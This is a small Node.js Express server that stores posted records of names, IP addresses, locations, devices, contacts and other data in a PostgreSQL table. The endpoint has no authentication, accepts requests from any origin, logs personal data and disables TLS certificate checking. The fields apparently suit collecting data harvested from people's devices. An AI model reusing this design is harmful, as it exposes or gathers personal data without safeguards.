require('dotenv').config();

const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

// PostgreSQL Connection
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false } // Required for Render.com
});

// Test the database connection
pool.connect((err, client, release) => {
    if (err) {
        return console.error('Error acquiring client', err.stack);
    }
    console.log('Connected to the database successfully!');
    release();
});

// API Route to update the database
app.post('/update-data', async (req, res) => {
    try {
        const { Name, IP, Location, Date, Device, Contacts, Data } = req.body;
        
        console.log("Received Data:", req.body);

        // SQL Query to insert data into all columns
        const query = `
        INSERT INTO "datatst" ("Name", "IP", "Location", "date", "device", "Contacts", "alldata") 
        VALUES ($1, $2, $3, $4, $5, $6, $7)
        ON CONFLICT ("Name") 
        DO UPDATE SET 
            "IP" = EXCLUDED."IP",
            "Location" = EXCLUDED."Location",
            "date" = EXCLUDED."date",
            "device" = EXCLUDED."device",
            "Contacts" = EXCLUDED."Contacts",
            "alldata" = EXCLUDED."alldata";
    `;

        await pool.query(query, [Name, IP, Location, Date, Device, Contacts, Data]);
        res.send("Data inserted successfully!");
    } catch (error) {
        console.error("Error:", error);
        res.status(500).send("Server error");
    }
});

// Start Server
app.listen(port, () => console.log(`🚀 Server running on port ${port}`));
